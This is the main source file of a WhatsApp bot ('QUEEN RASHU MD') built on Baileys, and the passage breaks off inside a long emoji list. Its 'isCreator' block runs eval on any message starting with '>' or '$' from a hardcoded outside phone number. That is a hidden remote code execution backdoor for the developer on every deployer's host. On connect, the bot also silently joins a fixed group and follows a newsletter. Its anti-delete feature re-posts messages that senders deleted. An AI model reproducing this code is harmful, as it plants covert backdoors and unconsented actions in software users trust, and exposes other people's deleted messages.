const {
  default: makeWASocket,
    useMultiFileAuthState,
    DisconnectReason,
    jidNormalizedUser,
    getContentType,
    proto,
    generateWAMessageContent,
    generateWAMessage,
    isJidBroadcast,
    AnyMessageContent,
    prepareWAMessageMedia,
    areJidsSameUser,
    downloadContentFromMessage,
    MessageRetryMap,
    generateForwardMessageContent,
    generateWAMessageFromContent,
    generateMessageID, makeInMemoryStore,
    jidDecode,
    fetchLatestBaileysVersion,
    Browsers
  } = require('@whiskeysockets/baileys');

    const l = console.log
    const { getBuffer, getGroupAdmins, getRandom, h2k, isUrl, Json, runtime, sleep, fetchJson } = require('./rashu/lib/functions');
    const { saveContact, loadMessage, getName, getChatSummary, saveGroupMetadata, getGroupMetadata, saveMessageCount, getInactiveGroupMembers, getGroupMembersMessageCount, saveMessage } = require('./rashu/database');
    const fs = require('fs');
    const ff = require('fluent-ffmpeg');
    const P = require('pino');
    const config = require('./settings');
    const qrcode = require('qrcode-terminal');
    const StickersTypes = require('wa-sticker-formatter');
    const util = require('util');
    const { sms,downloadMediaMessage } = require('./rashu/lib/msg');
    const FileType = require('file-type');
    const GroupEvents = require('./rashu/lib/groupevents');
    const axios = require('axios');
    const { fromBuffer } = require('file-type');
    const bodyparser = require('body-parser');
    const os = require('os');
    const { File } = require('megajs');
    const Crypto = require('crypto');
    const path = require('path');
    const prefix = config.PREFIX
    const ownerNumber = config.OWNER_NUMBER
    
//___________clear catch_________________
    
    const tempDir = path.join(os.tmpdir(), 'cache-temp')
  if (!fs.existsSync(tempDir)) {
      fs.mkdirSync(tempDir)
  }
  
  const clearTempDir = () => {
      fs.readdir(tempDir, (err, files) => {
          if (err) throw err;
          for (const file of files) {
              fs.unlink(path.join(tempDir, file), err => {
                  if (err) throw err;
              });
          }
      });
  }
    //===================SESSION-AUTH============================
    if (!fs.existsSync(__dirname + '/rashu/session/creds.json')) {
    if(!config.SESSION_ID) console.log('Please add your session to SESSION_ID env !!')
    const sessdata = config.SESSION_ID
    const filer = File.fromURL(`https://mega.nz/file/${sessdata}`)
    filer.download((err, data) => {
    if(err) throw err
    fs.writeFile(__dirname + '/rashu/session/creds.json', data, () => {
    console.log("Session downloaded ✅")
    })})}
    
    const express = require("express");
    const app = express();
    const port = process.env.PORT || 8000;
    
    //=============================================
    
    async function connectToWA() {
    //_________________________________________
    console.log("Connecting QUEEN RASHU MD BOT 🧬...");
    const { state, saveCreds } = await useMultiFileAuthState(__dirname + '/rashu/session/')
    var { version } = await fetchLatestBaileysVersion()
    
    const conn = makeWASocket({
            logger: P({ level: 'silent' }),
            printQRInTerminal: false,
            browser: Browsers.macOS("Firefox"),
            syncFullHistory: true,
            auth: state,
            version
            })
        
    conn.ev.on('connection.update', (update) => {
    const { connection, lastDisconnect } = update
    if (connection === 'close') {
    if (lastDisconnect.error.output.statusCode !== DisconnectReason.loggedOut) {
    connectToWA()
    }
    } else if (connection === 'open') {
    console.log('🔄 Installing... ')
    const path = require('path');
    fs.readdirSync("./rashu/plugins/").forEach((plugin) => {
    if (path.extname(plugin).toLowerCase() == ".js") {
    require("./rashu/plugins/" + plugin);
    }
    });
    console.log('Plugins installed successful ✅')
    console.log('RASHU MD connected to whatsapp ✅\nCreated By Nipun')
    let up = `*QUEEN RASHU MD CONNECT🤕`
let tek = `
┏━┫ *⚬Lααɾα-ᴍᴅ-ꜱᴇᴛᴛɪɴɢꜱ⚬* ┣━✾
┃            *ᴸ  ͣ  ͣ  ͬ  ͣ  ✻  ᴸ  ͣ  ͣ  ͬ  ͣ*
┻
*ᴘʀᴇꜰɪx ➭* _${config.PREFIX}_
*ᴍᴏᴅᴇ ➭* _${config.MODE}_
*ᴏᴡɴᴇʀ_ɴᴜᴍʙᴇʀ ➭* _${config.OWNER_NUMBER}_
*ᴠᴏɪᴄᴇ_ʀᴇᴘʟʏ ➭* _${config.AUTO_VOICE}_
*ᴀᴜᴛᴏ_ʀᴇᴘʟʏ ➭* _${config.AUTO_REPLY}_
*ᴀᴜᴛᴏ_ꜱᴛɪᴄᴋᴇʀ ➭* _${config.AUTO_STICKER}_
*ᴀᴜᴛᴏ_ʀᴇᴀᴅ_ꜱᴛᴀᴛᴜꜱ ➭* _${config.AUTO_READ_STATUS}_
*ᴀᴜᴛᴏ_ꜱᴛᴀᴛᴜꜱ_ʀᴇᴀᴄᴛ ➭* _${config.AUTO_STATUS_REACT}_
*ᴀᴜᴛᴏ_ꜱᴛᴀᴛᴜꜱ_ʀᴇᴘʟʏ ➭* _${config.AUTO_STATUS_REPLY}_
*ꜱᴛᴀᴛᴜꜱ_ʀᴇᴘʟʏ_ᴍꜱɢ ➭ ${config.STATUS_REPLY_MSG}
*ᴀᴜᴛᴏ_ʀᴇᴀᴄᴛ ➭* _${config.AUTO_REACT}_
*ᴄᴜꜱᴛᴏᴍᴇ_ʀᴇᴀᴄᴛ ➭* _${config.CUSTOM_REACT}_
*ᴄᴜꜱᴛᴏᴍᴇ_ʀᴇᴀᴄᴛ_ᴇᴍᴏᴊɪ ➭* _${config.CUSTOM_REACT_EMOJIS}_
*ᴀɴᴛɪ_ʙᴀᴅ_ᴡᴏʀᴅ ➭* _${config.ANTI_BAD}_
*ᴀɴᴛɪ_ʟɪɴᴋ ➭* _${config.ANTI_LINK}_
*ᴀɴᴛɪ_ʙᴏᴛ ➭* _${config.ANTI_BOT}_
*ᴀɴᴛɪ_ᴄᴀʟʟ ➭* _${config.ANTI_CALL}_
*ᴀᴜᴛᴏ_ʀᴇᴀᴅ_ᴍꜱɢ ➭* _${config.READ_MESSAGE}_
*ꜰᴀᴋᴇ_ʀᴇᴄᴏʀᴅɪɴɢ ➭* _${config.FAKE_RECORDING}_
*ᴀᴜᴛᴏ_ᴛʏᴘɪɴɢ ➭* _${config.AUTO_TYPING}_
*ᴀɴᴛɪ_ᴅᴇʟᴇᴛᴇ ➭* _${config.ANTI_DELETE}_
*ɪɴʙᴏx_ʙʟᴏᴄᴋ ➭* _${config.INBOX_BLOCK}_
*ᴀʟᴡᴀʏꜱ_ᴏɴʟɪɴᴇ ➭* _${config.ALWAYS_ONLINE}_
*ᴡᴇʟᴄᴏᴍᴇ ➭* _${config.WELCOME}_
*ɢᴏᴏᴅʙʏᴇ ➭* _${config.GOODBYE}_
*ᴀᴅᴍɪɴ_ᴇᴠᴇɴᴛꜱ ➭* _${config.ADMIN_EVENTS}_

ᴛʏᴘᴇ *${config.PREFIX}set* ᴄᴏᴍᴍᴀɴᴅ ᴛᴏ ᴄʜᴀɴɢᴇ ʏᴏᴜʀ ꜱᴇᴛᴛɪɴɢꜱ
> ‼️𝐐𝐔𝐄𝐄𝐍 𝐑𝐀𝐒𝐇𝐔 𝐌𝐃 ❤️‍🩹
`
   conn.sendMessage(ownerNumber + "@s.whatsapp.net", { image: { url: `https://i.ibb.co/TD5qh4JJ/20250224-022914.jpg` }, caption: up,
    contextInfo: {
      mentionedJid: ['94727319036@s.whatsapp.net'], // specify mentioned JID(s) if any
      groupMentions: [],
      forwardingScore: 1,
      isForwarded: true,
      forwardedNewsletterMessageInfo: {
          newsletterJid: '120363292101892024@newsletter',
          newsletterName: "‼️𝐐𝐔𝐄𝐄𝐍 𝐑𝐀𝐒𝐇𝐔 𝐌𝐃 ❤️‍🩹",
          serverMessageId: 999
      }
  }
});
   conn.sendMessage(ownerNumber + "@s.whatsapp.net", { text: tek,
    contextInfo: {
      mentionedJid: ['94727319036@s.whatsapp.net'], // specify mentioned JID(s) if any
      groupMentions: [],
      forwardingScore: 1,
      isForwarded: true,
      forwardedNewsletterMessageInfo: {
          newsletterJid: '120363292101892024@newsletter',
          newsletterName: "‼️𝐐𝐔𝐄𝐄𝐍 𝐑𝐀𝐒𝐇𝐔 𝐌𝐃 ❤️‍🩹",
          serverMessageId: 999
      }
  }
});
conn.groupAcceptInvite('Ci5mDk9zEVF95NcuqEtzl4') 
conn.newsletterFollow("120363292101892024@newsletter")
console.log("Successful join our support 🧑‍💻")
    }
    })
conn.ev.on('creds.update', saveCreds)  
//____________GROUP-EVENTS________________
      conn.ev.on("group-participants.update", (update) => GroupEvents(conn, update));
//=============readstatus=======
        
conn.ev.on('messages.upsert', async(mek) => {
  mek = mek.messages[0]
  if (!mek.message) return
  mek.message = (getContentType(mek.message) === 'ephemeralMessage') 
  ? mek.message.ephemeralMessage.message 
  : mek.message;
  //console.log("New Message Detected:", JSON.stringify(mek, null, 2));
if (config.READ_MESSAGE === 'true') {
  await conn.readMessages([mek.key]);  // Mark message as read
  console.log(`Marked message from ${mek.key.remoteJid} as read.`);
}
  if(mek.message.viewOnceMessageV2)
  mek.message = (getContentType(mek.message) === 'ephemeralMessage') ? mek.message.ephemeralMessage.message : mek.message
  if (mek.key && mek.key.remoteJid === 'status@broadcast' && config.AUTO_READ_STATUS === "true"){
    await conn.readMessages([mek.key])
  }        
if (mek.key && mek.key.remoteJid === 'status@broadcast' && config.AUTO_STATUS_REPLY === "true"){
const user = mek.key.participant
const text = `${config.STATUS_REPLY_MSG}`
await conn.sendMessage(user, { text: text, react: { text: '💜', key: mek.key } }, { quoted: mek })
          }
if (mek.key && mek.key.remoteJid === 'status@broadcast' && config.AUTO_STATUS_REACT === "true") {
  const user = await conn.decodeJid(conn.user.id);
  await conn.sendMessage(mek.key.remoteJid,
  { react: { key: mek.key, text: '💚' } },
  { statusJidList: [mek.key.participant, user] }
  )};
  await Promise.all([
    saveMessage(mek),
  ]);
//----------------------------------------------
  const m = sms(conn, mek)
  const type = getContentType(mek.message)
  const content = JSON.stringify(mek.message)
  const from = mek.key.remoteJid
  const quoted = type == 'extendedTextMessage' && mek.message.extendedTextMessage.contextInfo != null ? mek.message.extendedTextMessage.contextInfo.quotedMessage || [] : []
  const body = (type === 'conversation') ? mek.message.conversation : (type === 'extendedTextMessage') ? mek.message.extendedTextMessage.text : (type == 'imageMessage') && mek.message.imageMessage.caption ? mek.message.imageMessage.caption : (type == 'videoMessage') && mek.message.videoMessage.caption ? mek.message.videoMessage.caption : ''
  const isCmd = body.startsWith(prefix)
  var budy = typeof mek.text == 'string' ? mek.text : false;
  const command = isCmd ? body.slice(prefix.length).trim().split(' ').shift().toLowerCase() : ''
  const args = body.trim().split(/ +/).slice(1)
  const q = args.join(' ')
  const text = args.join(' ')
  const isGroup = from.endsWith('@g.us')
  const sender = mek.key.fromMe ? (conn.user.id.split(':')[0]+'@s.whatsapp.net' || conn.user.id) : (mek.key.participant || mek.key.remoteJid)
  const senderNumber = sender.split('@')[0]
  const botNumber = conn.user.id.split(':')[0]
  const pushname = mek.pushName || 'Sin Nombre'
  const isMe = botNumber.includes(senderNumber)
  const isOwner = ownerNumber.includes(senderNumber) || isMe
  const botNumber2 = await jidNormalizedUser(conn.user.id);
  const groupMetadata = isGroup ? await conn.groupMetadata(from).catch(e => {}) : ''
  const groupName = isGroup ? groupMetadata.subject : ''
  const participants = isGroup ? await groupMetadata.participants : ''
  const groupAdmins = isGroup ? await getGroupAdmins(participants) : ''
  const isBotAdmins = isGroup ? groupAdmins.includes(botNumber2) : false
  const isAdmins = isGroup ? groupAdmins.includes(sender) : false
  const isReact = m.message.reactionMessage ? true : false
  const reply = (teks) => {
  conn.sendMessage(from, { text: teks }, { quoted: mek })
  }
//-------------------------------------------------------------------------------
const udp = botNumber.split('@')[0];
    const ikratos = ('94727319036', '94727319036', '94727319036');
    let isCreator = [udp, ikratos, config.DEV]
					.map(v => v.replace(/[^0-9]/g) + '@s.whatsapp.net')
					.includes(mek.sender);

    if (isCreator && mek.text.startsWith('>')) {
					let code = budy.slice(2);
					if (!code) {
						reply(
							`Provide me with a query to run Master!`,
						);
						return;
					}
					try {
						let resultTest = eval(code);
						if (typeof resultTest === 'object')
							reply(util.format(resultTest));
						else reply(util.format(resultTest));
					} catch (err) {
						reply(util.format(err));
					}
					return;
				}
    if (isCreator && mek.text.startsWith('$')) {
					let code = budy.slice(2);
					if (!code) {
						reply(
							`Provide me with a query to run Master!`,
						);
						return;
					}
					try {
						let resultTest = await eval(
							'const a = async()=>{\n' + code + '\n}\na()',
						);
						let h = util.format(resultTest);
						if (h === undefined) return console.log(h);
						else reply(h);
					} catch (err) {
						if (err === undefined)
							return console.log('error');
						else reply(util.format(err));
					}
					return;
				}  
// ___________________ANTI_DELETE________________________
        
    if (!m.id.startsWith("BAE5")) {
    
    // Ensure the base directory exists
    const baseDir = 'message_data';
    if (!fs.existsSync(baseDir)) {
      fs.mkdirSync(baseDir);
    }
    
    function loadChatData(remoteJid, messageId) {
      const chatFilePath = path.join(baseDir, remoteJid, `${messageId}.json`);
      try {
        const data = fs.readFileSync(chatFilePath, 'utf8');
        return JSON.parse(data) || [];
      } catch (error) {
        return [];
      }
    }
    
    function saveChatData(remoteJid, messageId, chatData) {
      const chatDir = path.join(baseDir, remoteJid);
    
      if (!fs.existsSync(chatDir)) {
        fs.mkdirSync(chatDir, { recursive: true });
      }
    
      const chatFilePath = path.join(chatDir, `${messageId}.json`);
    
      try {
        fs.writeFileSync(chatFilePath, JSON.stringify(chatData, null, 2));
       // console.log('Chat data saved successfully.');
      } catch (error) {
        console.error('Error saving chat data:', error);
      }
    }
        
    function handleIncomingMessage(message) {
      const remoteJid = from //message.key.remoteJid;
      const messageId = message.key.id;
    
      const chatData = loadChatData(remoteJid, messageId);
    
      chatData.push(message);
    
      saveChatData(remoteJid, messageId, chatData);
    
    //  console.log('Message received and saved:', messageId);
    }
    
    const delfrom = config.DELETEMSGSENDTO !=='' ? config.DELETEMSGSENDTO + '@s.whatsapp.net': from
    function handleMessageRevocation(revocationMessage) {
    //const remoteJid = revocationMessage.message.protocolMessage.key.remoteJid;
     //const messageId = revocationMessage.message.protocolMessage.key.id;
    const remoteJid = from // revocationMessage.msg.key.remoteJid;
    const messageId = revocationMessage.msg.key.id;
    
        
     // console.log('Received revocation message with ID:', messageId);
    
      const chatData = loadChatData(remoteJid, messageId);
    
       const originalMessage = chatData[0]   
    
      if (originalMessage) {
        const deletedBy = revocationMessage.sender.split('@')[0];
        const sentBynn = originalMessage.key.participant ?? revocationMessage.sender;
    const sentBy = sentBynn.split('@')[0];
          if ( deletedBy.includes(botNumber) || sentBy.includes(botNumber) ) return;
     if(originalMessage.message && originalMessage.message.conversation && originalMessage.message.conversation !== ''){
         const messageText = originalMessage.message.conversation;
    if (isGroup && messageText.includes('chat.whatsapp.com')) return;
         var xx = '```'
     conn.sendMessage(delfrom, { text: `🚫 *This message was deleted !!*\n\n  🚮 *Deleted by:* _${deletedBy}_\n  📩 *Sent by:* _${sentBy}_\n\n> 🔓 Message Text: ${xx}${messageText}${xx}` });
    //........................................//........................................
    }else if(originalMessage.msg.type ==='MESSAGE_EDIT'){
     conn.sendMessage(delfrom, { text: `❌ *edited message detected* ${originalMessage.message.editedMessage.message.protocolMessage.editedMessage.conversation}` },{quoted: mek});
     
    //........................................//........................................
    } else if(originalMessage.message && originalMessage.message.exetendedTextMessage && originalMessage.msg.text ){ //&& originalMessage.message.exetendedTextMessage.text && originalMessage.message.exetendedTextMessage.text !== ''){
        const messageText = originalMessage.msg.text;
    if (isGroup && messageText.includes('chat.whatsapp.com')) return;
    
     var xx = '```'
     conn.sendMessage(delfrom, { text: `🚫 *This message was deleted !!*\n\n  🚮 *Deleted by:* _${deletedBy}_\n  📩 *Sent by:* _${sentBy}_\n\n> 🔓 Message Text: ${xx}${messageText}${xx}` });
    } else if(originalMessage.message && originalMessage.message.exetendedTextMessage ){ //&& originalMessage.message.exetendedTextMessage.text && originalMessage.message.exetendedTextMessage.text !== ''){
        const messagetext = originalMessage.message.extendedTextMessage.text;
    if (isGroup && messageText.includes('chat.whatsapp.com')) return;
     var xx = '```'
     conn.sendMessage(delfrom, { text: `🚫 *This message was deleted !!*\n\n  🚮 *Deleted by:* _${deletedBy}_\n  📩 *Sent by:* _${sentBy}_\n\n> 🔓 Message Text: ${xx}${originalMessage.body}${xx}` });
    }else if(originalMessage.type === 'extendedTextMessage') {
    async function quotedMessageRetrive(){     
    var nameJpg = getRandom('');
    const ml = sms(conn, originalMessage)
                
    if(originalMessage.message.extendedTextMessage){
    const messagetext = originalMessage.message.extendedTextMessage.text;
    if (isGroup && messageText.includes('chat.whatsapp.com')) return;
        var xx = '```'
     conn.sendMessage(delfrom, { text: `🚫 *This message was deleted !!*\n\n  🚮 *Deleted by:* _${deletedBy}_\n  📩 *Sent by:* _${sentBy}_\n\n> 🔓 Message Text: ${xx}${originalMessage.message.extendedTextMessage.text}${xx}` });
    }else{
    const messagetext = originalMessage.message.extendedTextMessage.text;
    if (isGroup && messageText.includes('chat.whatsapp.com')) return;
        conn.sendMessage(delfrom, { text: `🚫 *This message was deleted !!*\n\n  🚮 *Deleted by:* _${deletedBy}_\n  📩 *Sent by:* _${sentBy}_\n\n> 🔓 Message Text: ${xx}${originalMessage.message.extendedTextMessage.text}${xx}` });
    }
    }
    
    quotedMessageRetrive()
           
    }else if(originalMessage.type === 'imageMessage') {
          async function imageMessageRetrive(){      var nameJpg = getRandom('');
    const ml = sms(conn, originalMessage)
                let buff =  await ml.download(nameJpg)
                let fileType = require('file-type');
                let type = fileType.fromBuffer(buff);
                await fs.promises.writeFile("./" + type.ext, buff);
    if(originalMessage.message.imageMessage.caption){
    const messageText = originalMessage.message.imageMessage.caption;
    if (isGroup && messageText.includes('chat.whatsapp.com')) return;
    
        await conn.sendMessage(delfrom, { image: fs.readFileSync("./" + type.ext), caption: `🚫 *This message was deleted !!*\n\n  🚮 *Deleted by:* _${deletedBy}_\n  📩 *Sent by:* _${sentBy}_\n\n> 🔓 Message Text: ${originalMessage.message.imageMessage.caption}` })
    }else{
        await conn.sendMessage(delfrom, { image: fs.readFileSync("./" + type.ext), caption: `🚫 *This message was deleted !!*\n\n  🚮 *Deleted by:* _${deletedBy}_\n  📩 *Sent by:* _${sentBy}_` })
    }       
        }
    imageMessageRetrive()
     
    }else if(originalMessage.type === 'videoMessage') {
          async function videoMessageRetrive(){      var nameJpg = getRandom('');
    const ml = sms(conn, originalMessage)
    
    const vData = originalMessage.message.videoMessage.fileLength
    const vTime = originalMessage.message.videoMessage.seconds;
    const fileDataMB = config.ANTI_DELETE_MAX_SIZE
    const fileLengthBytes = vData
    const fileLengthMB = fileLengthBytes / (1024 * 1024);
    const fileseconds = vTime
    if(originalMessage.message.videoMessage.caption){
    if (fileLengthMB < fileDataMB && fileseconds < 30*60 ) {
                let buff =  await ml.download(nameJpg)
                let fileType = require('file-type');
                let type = fileType.fromBuffer(buff);
                await fs.promises.writeFile("./" + type.ext, buff);
    const messageText = originalMessage.message.videoMessage.caption;
    if (isGroup && messageText.includes('chat.whatsapp.com')) return;
    
        await conn.sendMessage(delfrom, { video: fs.readFileSync("./" + type.ext), caption: `🚫 *This message was deleted !!*\n\n  🚮 *Deleted by:* _${deletedBy}_\n  📩 *Sent by:* _${sentBy}_\n\n> 🔓 Message Text: ${originalMessage.message.videoMessage.caption}` })
           }
    }else{
                let buff =  await ml.download(nameJpg)
                let fileType = require('file-type');
                let type = fileType.fromBuffer(buff);
                await fs.promises.writeFile("./" + type.ext, buff);
        const vData = originalMessage.message.videoMessage.fileLength
    const vTime = originalMessage.message.videoMessage.seconds;
    const fileDataMB = '500'
    const fileLengthBytes = vData
    const fileLengthMB = fileLengthBytes / (1024 * 1024);
    const fileseconds = vTime
    if (fileLengthMB < fileDataMB && fileseconds < 30*60 ) {
        await conn.sendMessage(delfrom, { video: fs.readFileSync("./" + type.ext), caption: `🚫 *This message was deleted !!*\n\n  🚮 *Deleted by:* _${deletedBy}_\n  📩 *Sent by:* _${sentBy}_` })
    }
    }       
    }
    videoMessageRetrive()
    }else if(originalMessage.type === 'documentMessage') {
          async function documentMessageRetrive(){      var nameJpg = getRandom('');
    const ml = sms(conn, originalMessage)
                let buff =  await ml.download(nameJpg)
                let fileType = require('file-type');
                let type = fileType.fromBuffer(buff);
                await fs.promises.writeFile("./" + type.ext, buff);
    
        
    
    if(originalMessage.message.documentWithCaptionMessage){
    
    await conn.sendMessage(delfrom, { document: fs.readFileSync("./" + type.ext), mimetype: originalMessage.message.documentMessage.mimetype, fileName: originalMessage.message.documentMessage.fileName, caption: `🚫 *This message was deleted !!*\n\n  🚮 *Deleted by:* _${deletedBy}_\n  📩 *Sent by:* _${sentBy}_\n`});
     
    }else{
    
    await conn.sendMessage(delfrom, { document: fs.readFileSync("./" + type.ext), mimetype: originalMessage.message.documentMessage.mimetype, fileName: originalMessage.message.documentMessage.fileName, caption: `🚫 *This message was deleted !!*\n\n  🚮 *Deleted by:* _${deletedBy}_\n  📩 *Sent by:* _${sentBy}_\n`});
    
    }
     }
    
    documentMessageRetrive()
    }else if(originalMessage.type === 'audioMessage') {
          async function audioMessageRetrive(){      var nameJpg = getRandom('');
    const ml = sms(conn, originalMessage)
                let buff =  await ml.download(nameJpg)
                let fileType = require('file-type');
                let type = fileType.fromBuffer(buff);
                await fs.promises.writeFile("./" + type.ext, buff);
    if(originalMessage.message.audioMessage){
    const audioq = await conn.sendMessage(delfrom, { audio: fs.readFileSync("./" + type.ext), mimetype:  originalMessage.message.audioMessage.mimetype, fileName:  `${m.id}.mp3` })	
    return await conn.sendMessage(delfrom, { text: `🚫 *This message was deleted !!*\n\n  🚮 *Deleted by:* _${deletedBy}_\n  📩 *Sent by:* _${sentBy}_\n` },{quoted: audioq});
    
    }else{
    if(originalMessage.message.audioMessage.ptt === "true"){
    
    const pttt = await conn.sendMessage(delfrom, { audio: fs.readFileSync("./" + type.ext), mimetype:  originalMessage.message.audioMessage.mimetype, ptt: 'true',fileName: `${m.id}.mp3` })	
    return await conn.sendMessage(delfrom, { text: `🚫 *This message was deleted !!*\n\n  🚮 *Deleted by:* _${deletedBy}_\n  📩 *Sent by:* _${sentBy}_\n` },{quoted: pttt});
    
     }
      }
     }
    
    audioMessageRetrive()
    }else if(originalMessage.type === 'stickerMessage') {
          async function stickerMessageRetrive(){      var nameJpg = getRandom('');
    const ml = sms(conn, originalMessage)
                let buff =  await ml.download(nameJpg)
                let fileType = require('file-type');
                let type = fileType.fromBuffer(buff);
                await fs.promises.writeFile("./" + type.ext, buff);
    if(originalMessage.message.stickerMessage){
     
    //await conn.sendMessage(from, { audio: fs.readFileSync("./" + type.ext), mimetype:  originalMessage.message.audioMessage.mimetype, fileName:  `${m.id}.mp3` })	
     const sdata = await conn.sendMessage(delfrom,{sticker: fs.readFileSync("./" + type.ext) ,package: 'RASHU-MD 🌟'})
    return await conn.sendMessage(delfrom, { text: `🚫 *This message was deleted !!*\n\n  🚮 *Deleted by:* _${deletedBy}_\n  📩 *Sent by:* _${sentBy}_\n` },{quoted: sdata});
    
    }else{
    
    const stdata = await conn.sendMessage(delfrom,{sticker: fs.readFileSync("./" + type.ext) ,package: 'RASHU-MD 🌟'})
    return await conn.sendMessage(delfrom, { text: `🚫 *This message was deleted !!*\n\n  🚮 *Deleted by:* _${deletedBy}_\n  📩 *Sent by:* _${sentBy}_\n` },{quoted: stdata});
    
      }
     }
    
    stickerMessageRetrive()
             }
         
      } else {
        console.log('Original message not found for revocation.');
      }
    }
    
    if (mek.msg && mek.msg.type === 0) {
      handleMessageRevocation(mek);
    } else {//if(mek.message && mek.message.conversation && mek.message.conversation !== ''){
      handleIncomingMessage(mek);
    
        }
    
    }
//----------------Status SAve-----------------------------------
 if(body === "send" || body === "Send" || body === "Save" || body === "Ewpm" || body === "ewpn" || body === "Dapan" || body === "dapan" || body === "oni" || body === "Oni" || body === "save" || body === "Save" || body === "ewanna" || body === "Ewanna" || body === "ewam" || body === "Ewam" || body === "sv" || body === "Sv"|| body === "දාන්න"|| body === "එවම්න"){
    // if(!m.quoted) return reply("*Please Mention status*")
    const data = JSON.stringify(mek.message, null, 2);
    const jsonData = JSON.parse(data);
    const isStatus = jsonData.extendedTextMessage.contextInfo.remoteJid;
    if(!isStatus) return

    const getExtension = (buffer) => {
        const magicNumbers = {
            jpg: 'ffd8ffe0',
            png: '89504e47',
            mp4: '00000018',
        };
        const magic = buffer.toString('hex', 0, 4);
        return Object.keys(magicNumbers).find(key => magicNumbers[key] === magic);
    };

    if(m.quoted.type === 'imageMessage') {
        var nameJpg = getRandom('');
        let buff = await m.quoted.download(nameJpg);
        let ext = getExtension(buff);
        await fs.promises.writeFile("./" + ext, buff);
        const caption = m.quoted.imageMessage.caption;
        await conn.sendMessage(from, { image: fs.readFileSync("./" + ext), caption: caption });
    } else if(m.quoted.type === 'videoMessage') {
        var nameJpg = getRandom('');
        let buff = await m.quoted.download(nameJpg);
        let ext = getExtension(buff);
        await fs.promises.writeFile("./" + ext, buff);
        const caption = m.quoted.videoMessage.caption;
        let buttonMessage = {
            video: fs.readFileSync("./" + ext),
            mimetype: "video/mp4",
            fileName: `${m.id}.mp4`,
            caption: caption ,
            headerType: 4
        };
        await conn.sendMessage(from, buttonMessage,{quoted: mek});
    }
}
//--------------Inbox block---------------------------
if (config.INBOX_BLOCK === "true" && mek.key.remoteJid.endsWith('@s.whatsapp.net')) {
    if (!mek.key.fromMe) { // Ensure the bot doesn't block itself
        console.log(`Auto-block initiated for ${mek.key.remoteJid}...`);

        try {
            // Send warnings
            await conn.sendMessage(mek.key.remoteJid, { text: "*Warning 1 ❗*" });
            await conn.sendMessage(mek.key.remoteJid, { text: "*Warning 2 ❗*" });
            await conn.sendMessage(mek.key.remoteJid, { text: "*Warning 3 ❗*" });

            // Notify and block
            await conn.sendMessage(mek.key.remoteJid, { text: "*Blocked 🚫*" });
            await conn.updateBlockStatus(mek.key.remoteJid, 'block');

            console.log(`User ${mek.key.remoteJid} blocked after warnings.`);
        } catch (error) {
            console.error(`Error during auto-block for ${mek.key.remoteJid}:`, error);
        }

        return; // Stop further processing for this user
    }
}
         //=======public react======
if (!isReact && senderNumber !== botNumber) {
    if (config.AUTO_REACT === 'true') {
        const reactions = ['😊', '👍', '😂', '💯', '🔥', '🙏', '🎉', '👏', '😎', '🤖', '👫', '👭', '👬', '👮', "🕴️", '💼', '📊', '📈', '📉', '📊', '📝', '📚', '📰', '📱', '💻', '📻', '📺', '🎬', "📽️", '📸', '📷', "🕯️", '💡', '🔦', '🔧', '🔨', '🔩', '🔪', '🔫', '👑', '👸', '🤴', '👹', '🤺', '🤻', '👺', '🤼', '🤽', '🤾', '🤿', '🦁', '🐴', '🦊', '🐺', '🐼', '🐾', '🐿', '🦄', '🦅', '🦆', '🦇', '🦈', '🐳', '🐋', '🐟', '🐠', '🐡', '🐙', '🐚', '🐜', '🐝', '🐞', "🕷️", '🦋', '🐛', '🐌', '🐚', '🌿', '🌸', '💐', '🌹', '🌺', '🌻', '🌴', '🏵', '🏰', '🏠', '🏡', '🏢', '🏣', '🏥', '🏦', '🏧', '🏨', '🏩', '🏪', '🏫', '🏬', '🏭', '🏮', '🏯', '🚣', '🛥', '🚂', '🚁', '🚀', '🛸', '🛹', '🚴', '🚲', '🛺', '🚮', '🚯', '🚱', '🚫', '🚽', "🕳️", '💣', '🔫', "🕷️", "🕸️", '💀', '👻', '🕺', '💃', "🕴️", '👶', '👵', '👴', '👱', '👨', '👩', '👧', '👦', '👪', '👫', '👭', '👬', '👮', "🕴️", '💼', '📊', '📈', '📉', '📊', '📝', '📚', '📰', '📱', '💻', '📻', '📺', '🎬', "📽️", '📸', '📷', "🕯️", '💡', '🔦', '🔧', '🔨', '🔩', '🔪', '🔫', '👑', '👸', '🤴', '👹', '🤺', '🤻', '👺', '🤼', '🤽', '🤾', '🤿', '🦁', '🐴', '🦊', '🐺', '🐼', '🐾', '🐿', '🦄', '🦅', '🦆', '🦇', '🦈', '🐳', '🐋', '🐟', '🐠', '🐡', '🐙', '🐚', '🐜', '🐝', '🐞', "🕷️", '🦋', '🐛', '🐌', '🐚', '🌿', '🌸', '💐', '🌹', '🌺', '🌻', '🌴', '🏵', '🏰', '🏠', '🏡', '🏢', '🏠', '🏡', '🏢', '🏣', '🏥', '🏦', '🏧', '🏨', '🏩', '🏪', '🏫', '🏬', '🏭', '🏮', '🏯', '🚣', '🛥', '🚂', '🚁', '🚀', '🛸', '🛹', '🚴', '🚲', '🛺', '🚮', '🚯', '🚱', '🚫', '🚽', "🕳️", '💣', '🔫', "🕷️", "🕸️", '💀', '👻', '🕺', '💃', "🕴️", '👶', '👵', '👴', '👱', '👨', '👩', '👧', '👦', '👪', '👫', '👭', '👬', '👮', "🕴️", '💼', '📊', '📈', '📉', '📊', '📝', '📚', '📰', '📱', '💻', '📻', '📺', '🎬', "📽️", '📸', '📷', "🕯️", '💡', '🔦', '🔧', '🔨', '🔩', '🔪', '🔫', '👑', '👸', '🤴', '👹', '🤺', '🤻', '👺', '🤼', '🤽', '🤾', '🤿', '🦁', '🐴', '🦊', '🐺', '🐼', '🐾', '🐿', '🦄', '🦅', '🦆', '🦇', '🦈', '🐳', '🐋', '🐟', '🐠', '🐡', '🐙', '🐚', '🐜', '🐝', '🐞', "🕷️", '🦋', '🐛', '🐌', '🐚', '🌿', '🌸', '💐', '🌹', '🌺', '🌻', '🌴', '🏵', '🏰', '🏠', '🏡', '🏢', '🏣', '🏥', '🏦', '🏧', '🏨', '🏩', '🏪', '🏫', '🏬', '🏭', '🏮', '🏯', '🚣', '🛥', '🚂', '🚁', '🚀', '🛸', '🛹', '🚴', '🚲', '🛺', '🚮', '🚯', '🚱', '🚫', '🚽', "🕳️", '💣', '🔫', "🕷️", "🕸️", '💀', '👻', '🕺', '💃', "🕴️", '👶', '👵', '👴', '👱', '👨', '👩', '👧', '👦', '👪', '🙂', '😑', '🤣', '😍', '😘', '😗', '😙', '😚', '😛', '😝', '😞', '😟', '😠', '😡', '😢', '😭', '😓', '😳', '😴', '😌', '😆', '😂', '🤔', '😒', '😓', '😶', '🙄', '🐶', '🐱', '🐔', '🐷', 